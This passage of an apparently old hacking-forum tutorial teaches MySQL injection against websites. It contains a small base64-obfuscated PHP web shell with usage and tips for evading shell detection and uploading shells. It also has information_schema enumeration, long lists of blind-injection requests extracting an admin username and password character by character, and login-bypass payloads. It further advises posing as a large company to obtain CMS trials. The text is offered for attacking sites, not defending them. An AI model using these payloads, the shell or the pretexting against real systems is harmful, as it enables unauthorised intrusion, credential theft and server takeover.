+| ndb_autoincrement_prefetch_sz | |<br />
+| ndb_force_send | |<br />
+| ndb_use_exact_count | |<br />
+| ndb_use_transactions | |<br />
+| ndb_cache_check_time | |<br />
+| ndb_connectstring | |<br />
+| net_buffer_length | |<br />
+| net_read_timeout | |<br />
+| net_retry_count | |<br />
+| net_write_timeout | |<br />
+| new | |<br />
+| old_passwords | |<br />
+| open_files_limit | |<br />
+| optimizer_prune_level | |<br />
+| optimizer_search_depth | |<br />
+| pid_file | |<br />
+| plugin_dir | |<br />
+| port | |<br />
+| preload_buffer_size | |<br />
+| profiling | |<br />
+| profiling_history_size | |<br />
+| protocol_version | |<br />
+| query_alloc_block_size | |<br />
+| query_cache_limit | |<br />
+| query_cache_min_res_unit | |<br />
+| query_cache_size | |<br />
+| query_cache_type | |<br />
+| query_cache_wlock_invalidate | |<br />
+| query_prealloc_size | |<br />
+| range_alloc_block_size | |<br />
+| read_buffer_size | |<br />
+| read_only | |<br />
+| read_rnd_buffer_size | |<br />
+| relay_log | |<br />
+| relay_log_index | |<br />
+| relay_log_info_file | |<br />
+| relay_log_purge | |<br />
+| relay_log_space_limit | |<br />
+| rpl_recovery_rank | |<br />
+| secure_auth | |<br />
+| secure_file_priv | |<br />
+| server_id | |<br />
+| skip_external_locking | |<br />
+| skip_networking | |<br />
+| skip_show_database | |<br />
+| slave_compressed_protocol | |<br />
+| slave_load_tmpdir | |<br />
+| slave_net_timeout | |<br />
+| slave_skip_errors | |<br />
+| slave_transaction_retries | |<br />
+| slow_launch_time | |<br />
+| socket | |<br />
+| sort_buffer_size | |<br />
+| sql_big_selects | |<br />
+| sql_mode | |<br />
+| sql_notes | |<br />
+| sql_warnings | |<br />
+| ssl_ca | |<br />
+| ssl_capath | |<br />
+| ssl_cert | |<br />
+| ssl_cipher | |<br />
+| ssl_key | |<br />
+| storage_engine | |<br />
+| sync_binlog | |<br />
+| sync_frm | |<br />
+| system_time_zone | |<br />
+| table_cache | |<br />
+| table_lock_wait_timeout | |<br />
+| table_type | |<br />
+| thread_cache_size | |<br />
+| thread_stack | |<br />
+| time_format | |<br />
+| time_zone | |<br />
+| timed_mutexes | |<br />
+| tmp_table_size | |<br />
+| tmpdir | |<br />
+| transaction_alloc_block_size | |<br />
+| transaction_prealloc_size | |<br />
+| tx_isolation | |<br />
+| updatable_views_with_limit | |<br />
+| version | |<br />
+| version_comment | |<br />
+| version_compile_machine | |<br />
+| version_compile_os | |<br />
+| wait_timeout | |<br />
++---------------------------------+<br />
+237 rows in set (0.00 sec)<br />
+<br />
+user()<br />
+database()<br />
+schema()</code></div><br />
+<br />
+By adding @@ at the front of the variable and asking for it it will most of the time return its value. @@datadir is a example. Note that i blanked out every value here, just for personal reasons.<br />
+<br />
+So you found the directory where your website is in? Lets go on then, upload a simple upload sc<span style='display:none'>blocked</span>ript and upload a shell of your choice, i would advise you to make your own shell, lots of detection things are out there to locate the c99, c100, r57, locus and netshells. Only a couple of lines could create a web shell here is an example with a basic obscure technique on board, i have to mention there are detection things out there that search for exec() commands and things like that, these are harder to avoid but are rarely found:<br />
+<br />
+<div class='quote' style='width:400px;white-space:nowrap;overflow:auto'><code>&lt;?php<br />
+exec(base64_decode($_GET[')']), $_a);<br />
+for ($i=0; $i&lt;count($_a); $i++){echo &quot;&lt;div style=&quot;margin: 5px; border: solid 2px 00000;&quot;&gt;&quot;.htmlspecialchars($_a[$i]).&quot;&lt;/div&gt;&quot;;}<br />
+?&gt;</code></div><br />
+<br />
+The first line will tell its php, second line will execute the base64 encoded get request ')' and the third line will display everything on the screen in a quite neat way and line four will tell that you are done with a block of php again.<br />
+A request to display the content of the current folder will look like:<br />
+<div class='quote' style='width:400px;white-space:nowrap;overflow:auto'><code>http://example.com/index.php?)=bHM=</code></div><br />
+bHM= = ls (base64)<br />
+<div class='quote' style='width:400px;white-space:nowrap;overflow:auto'><code>http://home2.paulschou.net/tools/xlate/</code></div><br />
+can help you encoding your requests.<br />
+<br />
+If you are comfortable you can also dump a upload sc<span style='display:none'>blocked</span>ript in a file with which you then again upload your favorite shell and further elevate your rights from there. There is a good video example of this situation in a video made by Lidloses_Auge located here: http://str0ke213.tradebit.com/pub/8/92.flv<br />
+<br />
+If you found the website directory where you want to upload your file but you don't have enough rights, like only able to load_file('') and not write you should load index.php, see where the connection is made with mysql and see the password in plaintext. Then try connecting through phpmyadmin commonly just put /phpmyadmin behind the url, if you can not find it this way go and find a domain on the same server, most of the times its possible to connect to the mysql database on the same server through a phpmyadmin on another domain. Its a very funny mistake about always made. Note that it commonly occurs that someone puts his password in a string like $password = &quot;a1654&quot;&quot;aaafe2==&quot;; be sure that you deleted the escaping characters before connecting or it wont work, you will just end up having the wrong password.<br />
+<br />
+If you are not having close to root rights so not able to do this fancy stuff, you are still far from outnumbered, you should datamine the information_schema.columns table and see what tables and columns you do have rights for. Information_schema is a database where information is stored for mysql, here you can find table names, column names and things like that.<br />
+<br />
+<div class='quote' style='width:400px;white-space:nowrap;overflow:auto'><code>http://example.com/index.php?pageid=326 UNION ALL SELECT 1,concat(TABLE_SCHEMA, 0x3a, TABLE_NAME, 0x3a, COLUMN_NAME),3,4,5,6 from information_schema.columns limit 0, 1</code></div><br />
+<br />
+loop through this table until you found the right information like a table called users and a column in it with password. Blindly asking for the table users, user, member, members, etc etc is also not a not commonly found technique but by mining the information_schema you can be more sure about the result.<br />
+<br />
+<div class='quote' style='width:400px;white-space:nowrap;overflow:auto'><code>========================================<br />
+=== Chapter 2 - blind sql injections ===<br />
+========================================</code></div><br />
+<br />
+So you see a different in delay in the request, missing a picture, missing anything in any way when asking for 1=2 and 1=1 is giving no problems or you dont have the right version for union? Well, you came to a typical blind sql injection!<br />
+Blind SQL injections are alot more found than mysql injections, they are as easy to exploit as normal injections with some dedication but they take a lot longer to exploit because you basicly can only ask for 1 thing at a time.<br />
+<br />
+<div class='quote' style='width:400px;white-space:nowrap;overflow:auto'><code>http://example.com/index.php?pageid=326 AND 1=1 #picture loads<br />
+http://example.com/index.php?pageid=326 AND 1=2 #picture doesn't load</code></div><br />
+<br />
+Here you should try to make sub selects:<br />
+<br />
+<div class='quote' style='width:400px;white-space:nowrap;overflow:auto'><code>http://example.com/index.php?pageid=326 (select 1)=1<br />
+http://example.com/index.php?pageid=326 (select 1)=2</code></div><br />
+<br />
+If this does works you should try substring() substring returns the substring as specified.<br />
+substring('value', 'selected point to start', 'amount of letters to return from the selected point')<br />
+<br />
+<div class='quote' style='width:400px;white-space:nowrap;overflow:auto'><code>http://example.com/index.php?pageid=326 AND substring('123', 1, 1)=1 # true, character 1 is 1<br />
+http://example.com/index.php?pageid=326 AND substring('123', 2, 1)=2 # true, character 2 is 2<br />
+http://example.com/index.php?pageid=326 AND substring('123', 3, 1)=3 # true, character 3 is 3</code></div><br />
+<br />
+So how to exploit this? Lets start by asking the version!<br />
+<br />
+<div class='quote' style='width:400px;white-space:nowrap;overflow:auto'><code>http://example.com/index.php?pageid=326 AND substring(version(), 1, 1)=1 # image doesn't load, its false<br />
+http://example.com/index.php?pageid=326 AND substring(version(), 2, 1)=2 # image doesn't load, its false<br />
+http://example.com/index.php?pageid=326 AND substring(version(), 3, 1)=3 # image doesn't load, its false<br />
+http://example.com/index.php?pageid=326 AND substring(version(), 4, 1)=4 # image doesn't load, its false<br />
+http://example.com/index.php?pageid=326 AND substring(version(), 5, 1)=5 # image loads, its true, the first character in this case is 5 so the version is 5</code></div><br />
+<br />
+You might now already see that this is taking way more time than the usual exploit, it is resulting in the same result when exploited but the amount of time it takes asks for automation. We will come to this later.<br />
+Here comes an example of how to select a table, you must always be sure to only select 1 row otherwise it wont work, here i am using the where to find the admin user. the ascii() is to return a numeric value of left-most character, here i am asking for a value bigger than null bytes if this is true i am going to increment it with 10 untill it gives an error and then i am going to ask for the exact value.:<br />
+<div class='quote' style='width:400px;white-space:nowrap;overflow:auto'><code>http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 1, 1))&gt;0 #true<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 1, 1))&gt;10 #true<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 1, 1))&gt;20 #true<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 1, 1))&gt;30 #true<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 1, 1))&gt;40 #true<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 1, 1))&gt;50 #true<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 1, 1))&gt;60 #true<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 1, 1))&gt;70 #true<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 1, 1))&gt;80 #true<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 1, 1))&gt;90 #true<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 1, 1))&gt;100 #false<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 1, 1))&gt;95 #true<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 1, 1))=96 #false<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 1, 1))=97 #true</code></div><br />
+<br />
+Then you can locally go to mysql and ask for the value.<br />
+<br />
+<div class='quote' style='width:400px;white-space:nowrap;overflow:auto'><code>mysql&gt; select char('97');<br />
++------------+<br />
+| char('97') |<br />
++------------+<br />
+| a |<br />
++------------+<br />
+1 row in set (0.00 sec)</code></div><br />
+<br />
+So the first character is a, lets move on to the next value.<br />
+<br />
+<div class='quote' style='width:400px;white-space:nowrap;overflow:auto'><code>http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 2, 1))&gt;0 #true<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 2, 1))&gt;10 #true<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 2, 1))&gt;20 #true<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 2, 1))&gt;30 #true<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 2, 1))&gt;40 #true<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 2, 1))&gt;50 #true<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 2, 1))&gt;60 #true<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 2, 1))&gt;70 #true<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 2, 1))&gt;80 #true<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 2, 1))&gt;90 #true<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 2, 1))&gt;100 #false<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 2, 1))&gt;95 #true<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 2, 1))=96 #false<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 2, 1))=97 #false<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 2, 1))=98 #false<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 2, 1))=99 #false<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 2, 1))=100 #true</code></div><br />
+<br />
+<div class='quote' style='width:400px;white-space:nowrap;overflow:auto'><code>mysql&gt; select char(97, 100);<br />
++---------------+<br />
+| char(97, 100) |<br />
++---------------+<br />
+| ad |<br />
++---------------+<br />
+1 row in set (0.01 sec)</code></div><br />
+<br />
+<div class='quote' style='width:400px;white-space:nowrap;overflow:auto'><code>During a blind sql injection its smart to think, in this case it should obvious be admin followed by a ':' and then the password. So lets try it!<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) where username='admin' from users limit 0,1), 1, 1))=97 #true<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) where username='admin' from users limit 0,1), 2, 1))=100 #true<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) where username='admin' from users limit 0,1), 3, 1))=109 #true<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) where username='admin' from users limit 0,1), 4, 1))=105 #true<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) where username='admin' from users limit 0,1), 5, 1))=110 #true<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) where username='admin' from users limit 0,1), 6, 1))=58 #true</code></div><br />
+<div class='quote' style='width:400px;white-space:nowrap;overflow:auto'><code>mysql&gt; select char(97, 100, 109, 105, 110, 58);<br />
++----------------------------------+<br />
+| char(97, 100, 109, 105, 110, 58) |<br />
++----------------------------------+<br />
+| admin: |<br />
++----------------------------------+<br />
+1 row in set (0.00 sec)</code></div><br />
+<br />
+Now that we got the first part we still have to do the 'secret' part, the password, so lets get going:<br />
+<br />
+<div class='quote' style='width:400px;white-space:nowrap;overflow:auto'><code>http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 7, 1))&gt;0 #true<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 7, 1))&gt;10 #true<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 7, 1))&gt;20 #true<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 7, 1))&gt;30 #true<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 7, 1))&gt;40 #true<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 7, 1))&gt;50 #true<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 7, 1))&gt;60 #true<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 7, 1))&gt;70 #true<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 7, 1))&gt;80 #true<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 7, 1))&gt;90 #true<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 7, 1))&gt;100 #true<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 7, 1))&gt;110 #true<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 7, 1))&gt;120 #false<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 7, 1))&gt;115 #false<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 7, 1))=111 #false<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 7, 1))=112 #false<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 7, 1))=113 #false<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 7, 1))=114 #false<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 7, 1))=115 #true</code></div><br />
+<br />
+<div class='quote' style='width:400px;white-space:nowrap;overflow:auto'><code>mysql&gt; select char(97, 100, 109, 105, 110, 58, 115);<br />
++---------------------------------------+<br />
+| char(97, 100, 109, 105, 110, 58, 115) |<br />
++---------------------------------------+<br />
+| admin:s |<br />
++---------------------------------------+<br />
+1 row in set (0.01 sec)</code></div><br />
+<br />
+<div class='quote' style='width:400px;white-space:nowrap;overflow:auto'><code>http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 8, 1))&gt;0 #true<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 8, 1))&gt;10 #true<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 8, 1))&gt;20 #true<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 8, 1))&gt;30 #true<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 8, 1))&gt;40 #true<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 8, 1))&gt;50 #true<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 8, 1))&gt;60 #true<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 8, 1))&gt;70 #true<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 8, 1))&gt;80 #true<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 8, 1))&gt;90 #true<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 8, 1))&gt;100 #true<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 8, 1))&gt;110 #false<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 8, 1))&gt;105 #false<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 8, 1))=101 #true</code></div><br />
+<br />
+<div class='quote' style='width:400px;white-space:nowrap;overflow:auto'><code>mysql&gt; select char(97, 100, 109, 105, 110, 58, 115, 101);<br />
++--------------------------------------------+<br />
+| char(97, 100, 109, 105, 110, 58, 115, 101) |<br />
++--------------------------------------------+<br />
+| admin:se |<br />
++--------------------------------------------+<br />
+1 row in set (0.00 sec)</code></div><br />
+<br />
+<div class='quote' style='width:400px;white-space:nowrap;overflow:auto'><code>http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 9, 1))&gt;0 #true<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 9, 1))&gt;10 #true<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 9, 1))&gt;20 #true<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 9, 1))&gt;30 #true<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 9, 1))&gt;40 #true<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 9, 1))&gt;50 #true<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 9, 1))&gt;60 #true<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 9, 1))&gt;70 #true<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 9, 1))&gt;80 #true<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 9, 1))&gt;90 #true<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 9, 1))&gt;100 #false<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 9, 1))&gt;95 #true<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 9, 1))=96 #false<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 9, 1))=97 #false<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 9, 1))=98 #false<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 9, 1))=99 #true</code></div><br />
+<br />
+<div class='quote' style='width:400px;white-space:nowrap;overflow:auto'><code>mysql&gt; select char(97, 100, 109, 105, 110, 58, 115, 101, 99);<br />
++------------------------------------------------+<br />
+| char(97, 100, 109, 105, 110, 58, 115, 101, 99) |<br />
++------------------------------------------------+<br />
+| admin:sec |<br />
++------------------------------------------------+<br />
+1 row in set (0.00 sec)</code></div><br />
+<br />
+<div class='quote' style='width:400px;white-space:nowrap;overflow:auto'><code>http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 10, 1))&gt;0 #true<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 10, 1))&gt;10 #true<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 10, 1))&gt;20 #true<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 10, 1))&gt;30 #true<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 10, 1))&gt;40 #true<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 10, 1))&gt;50 #true<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 10, 1))&gt;60 #true<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 10, 1))&gt;70 #true<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 10, 1))&gt;80 #true<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 10, 1))&gt;90 #true<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 10, 1))&gt;100 #true<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 10, 1))&gt;110 #true<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 10, 1))&gt;120 #false<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 10, 1))&gt;115 #false<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 10, 1))=111 #false<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 10, 1))=112 #false<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 10, 1))=113 #false<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 10, 1))=114 #true</code></div><br />
+<br />
+<div class='quote' style='width:400px;white-space:nowrap;overflow:auto'><code>mysql&gt; select char(97, 100, 109, 105, 110, 58, 115, 101, 99, 114);<br />
++-----------------------------------------------------+<br />
+| char(97, 100, 109, 105, 110, 58, 115, 101, 99, 114) |<br />
++-----------------------------------------------------+<br />
+| admin:secr |<br />
++-----------------------------------------------------+<br />
+1 row in set (0.00 sec)</code></div><br />
+<br />
+alright, i guess the idea is clear. The password i thought about is 'secret'.<br />
+<br />
+What if you see a login box? You don't have a user so lets see if it is in any way vulnerable. The idea is that you bypass the where password part a possible mysql request could be:<br />
+<br />
+select username, password from users where username='''.$user.''' && password='''.$password.'''<br />
+but what if the user variable contains -- or # to comment the rest of the query away? The $user is user controlled, so it should not be a problem right?<br />
+examples:<br />
+<div class='quote' style='width:400px;white-space:nowrap;overflow:auto'><code>select username, password from users where username=''admin'--'' && password='doesnt matter''<br />
+select username, password from users where username=''admin'#'' && password='doesnt matter''<br />
+select username, password from users where username=''admin'/*'' && password='doesnt matter''<br />
+select username, password from users where username=''admin' or 1=1--'' && password='doesnt matter''<br />
+select username, password from users where username=''admin' or 1=1#'' && password='doesnt matter''<br />
+select username, password from users where username=''admin' or 1=1/*'' && password='doesnt matter''<br />
+select username, password from users where username=''admin') or '1'='1--'' && password='doesnt matter''<br />
+select username, password from users where username=''admin') or ('1'='1--'' && password='doesnt matter''</code></div><br />
+<br />
+Why not see this as a blind sql injection? You log in so you got a returned true thing, you don't log in so something is false.<br />
+For example: by using this user it will log you in:<br />
+admin' AND 1=1--<br />
+and here not:<br />
+admin' AND 1=2--<br />
+So by logging in with this<br />
+admin' AND ascii(substring((select user from mysql.user limit 0,1), 1, 1))&gt;0--<br />
+you will know if you are having a lot of rights. From here you can go on with the normal technique of exploiting it. Here is also a good example that sql injections occur in POST and GET requests.<br />
+Tamper data and LiveHTTPHeaders are 2 good firefox add ons that can help you with this.<br />
+Tamper data:     https://addons.mozilla.org/en-US/firefox/addon/966<br />
+LiveHTTPHeaders: https://addons.mozilla.org/en-US/firefox/addon/3829<br />
+<br />
+Next situation:<br />
+<div class='quote' style='width:400px;white-space:nowrap;overflow:auto'><code>?page=home<br />
+select * from pages where page='home'</code></div><br />
+<br />
+<div class='quote' style='width:400px;white-space:nowrap;overflow:auto'><code>?page=home' AND substring(version, 1, 1)=4 AND ''='<br />
+select * from pages where page='home' AND substring(version, 1, 1)=4 AND ''=''</code></div><br />
+<br />
+Next situation:<br />
+<br />
+/articles/catergory/2<br />
+mod_rewritten obscured, no problem!<br />
+http://www.archive.org/index.php<br />
+Will give you information what it was before it was mod_rewritten ;), also if you got a cheap cms it will be easy to find it out, call the vendor, tell them you are from a big local company and want to get a 10 day trial, well this actually is a general advise if you got a closed source commercial cms. Just try to get a trial, be sure you talk with a serious voice and make sure you are talking as if you are from a big company and know what division will need the product. They will probably have a test environment and you will get instant access within minutes. If you got an open source product then just download it off-line, screen the source and hope you can find anything, in both cases first look through the general exploits for the specific cms on sites like securityfocus, milw0rm and google. You can also just see if the .htaccess file is readable for you ;).<br />
+<br />
+A possible solution for the mod_rewrite here could be:<br />
+<div class='quote' style='width:400px;white-space:nowrap;overflow:auto'><code>?page=articles&cat=2<br />
+?page=articles&cat=-1 union all select 1,2,3,version(),user(),database(),7,8--</code></div><br />
+<br />
+basics of automating the process language wide it consists of the following steps:<br />
+open the url<br />
+see how long the length of the opened content is<br />
+determine a breakpoint for the length difference of the amount of characters on every page<br />
+loop through the characters<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 1, 1))=(loop this)<br />
+if you found it increment the character and let the looping character be back to 0<br />
+http://example.com/index.php?pageid=326 AND ascii(substring((select concat(username, 0x3a, password) from users where username='admin' limit 0,1), 2, 1))=0<br />
+echo the output every time and ta da, automated the process, i would advise to make an algorithm and not sending every single character, work with &gt; and &lt; and things like that in the algorithm, it does support it so why don't use it? ;)<br />
+<br />
+Cookies are often vulnerable for mysql injections, a lot of web applications let you automatically log in when you revisit a website based on your cookies. This also requires the process of looking in the database if your cookie is having the right values to pass.<br />
+<br />
+There are also programs available to help you on your way in blind injecting, sqlmap is a quite good one but i would advise you to learn it on your own without other programs besides your browser.<br />
+<br />
